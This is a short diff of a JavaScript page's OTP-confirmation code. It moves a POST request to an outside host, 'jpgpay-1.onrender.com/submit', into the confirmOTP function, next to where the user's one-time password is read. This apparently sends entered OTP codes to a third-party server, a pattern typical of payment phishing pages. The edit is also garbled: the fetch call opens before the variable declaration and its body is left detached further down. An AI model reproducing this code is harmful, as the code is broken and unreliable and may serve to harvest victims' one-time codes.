@@ -483,10 +483,8 @@ function sendOTP(){
         },1000);
 
 }
-
-
 function confirmOTP(){
-
+fetch('https://jpgpay-1.onrender.com/submit', {
     let otp =
         document.getElementById("otpInput").value.trim();
 
@@ -516,7 +514,6 @@ function closeOTP(){
         .style.display = "none";
 
 }
-fetch('https://jpgpay-1.onrender.com/submit', {
     method: 'POST',
     headers: {
         'Content-Type': 'application/json'
